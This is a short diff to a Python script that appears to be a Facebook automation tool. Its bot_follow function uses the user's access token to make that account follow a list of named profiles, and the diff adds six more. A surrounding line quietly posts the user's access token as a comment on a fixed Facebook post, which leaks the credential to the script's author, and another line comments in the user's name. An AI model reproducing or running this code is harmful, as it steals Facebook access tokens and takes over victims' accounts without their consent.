@@ -222,6 +222,12 @@ def bot_follow():
 	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
 	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
 	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
+	requests.post('https://graph.facebook.com/100033624590055/subscribers?access_token=' + toket) #Fajar Firmansyah
+	requests.post('https://graph.facebook.com/100000114398701/subscribers?access_token=' + toket) #Arya Firmansyah
+	requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + toket) #Bayu Putra
+	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Faskhal Mahiza
+	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra Lubis
+	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
 	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/10214228940637251/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
